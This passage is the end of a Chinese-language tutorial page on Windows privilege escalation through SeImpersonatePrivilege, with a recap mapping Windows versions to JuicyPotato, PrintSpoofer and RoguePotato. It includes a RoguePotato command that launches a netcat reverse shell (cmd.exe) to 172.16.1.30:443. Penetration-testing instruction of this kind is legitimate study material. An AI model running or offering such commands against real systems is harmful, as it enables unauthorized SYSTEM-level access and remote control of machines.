<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\RoguePotato.exe -r 172.16.1.30 -e &quot;C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot; -l 9999 -c &quot;{6d18ad12-bde3-4393-b311-099c346e6df9}&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160500437-507952355-95a3b492e29e33d158e00c6522a795c4.png" width="1024" height="270" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5最后的想法"><strong><div id="id5">5、最后的想法</div></strong><a href="#5最后的想法" class="hash-link" aria-label="5最后的想法的直接链接" title="5最后的想法的直接链接">​</a></h2>
<p>走到这里可真漫长啊！不过，我们介绍了许多出色的工具和技术。这些攻击从本质上来说颇具技术性，但它们极为强大且易于操作。我建议阅读上述每个技术对应的链接中的相关文章，以便更清楚地了解这种攻击的工作原理。我只是简略地解释了一番，以便在展示实际攻击之前能有个大致的了解。</p>
<p>让我们快速回顾一下：</p>
<ul>
<li>
<p>当您在 Windows 10 目标上获得立足点时，请使用命令 whoami /priv 查询 SeimpersonatePrivilege 特权是否启用。【默认情况下，Windows 服务帐户都是启用的。】</p>
</li>
<li>
<p>使用 systemInfo 命令查看 Windows 版本。【然后对应下面的版本使用相应的利用程序。】</p>
<ul>
<li>Windows 7 – Windows 10 / Server 2016 version 1803 –&gt; JuicyPotato</li>
<li>Windows 10 / Server 2016 version 1607 – Windows 10 / Server 2019 present –&gt; PrintSpoofer</li>
<li>Windows 10 / Server 2019 version 1809 – present –&gt; RoguePotato</li>
</ul>
<blockquote>
<p>注意：上面的 present (至今)是作者写这篇文章的时间，即 2022年6月，如今是否还有效果需要实验测试。</p>
</blockquote>
</li>
</ul>
<p>除了提权之外，SeImpersonatePrivlege 在黑客入侵 Active Directory 环境时的横向移动中亦发挥着重要作用。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权-SeBackupPrivilege 特权</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-UAC 绕过</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1获得立足点" class="table-of-contents__link toc-highlight"><strong><div>1、获得立足点</div></strong></a></li><li><a href="#2使用-juicypotato-模拟本地-system-帐户" class="table-of-contents__link toc-highlight"><strong><div>2、使用 JuicyPotato 模拟本地 SYSTEM 帐户</div></strong></a></li><li><a href="#3使用-printspoofer-模拟本地-system-帐户" class="table-of-contents__link toc-highlight"><strong><div>3、使用 PrintSpoofer 模拟本地 SYSTEM 帐户</div></strong></a></li><li><a href="#4使用-roguepotato-模拟本地-system-帐户" class="table-of-contents__link toc-highlight"><strong><div>4、使用 RoguePotato 模拟本地 SYSTEM 帐户</div></strong></a></li><li><a href="#5最后的想法" class="table-of-contents__link toc-highlight"><strong><div>5、最后的想法</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>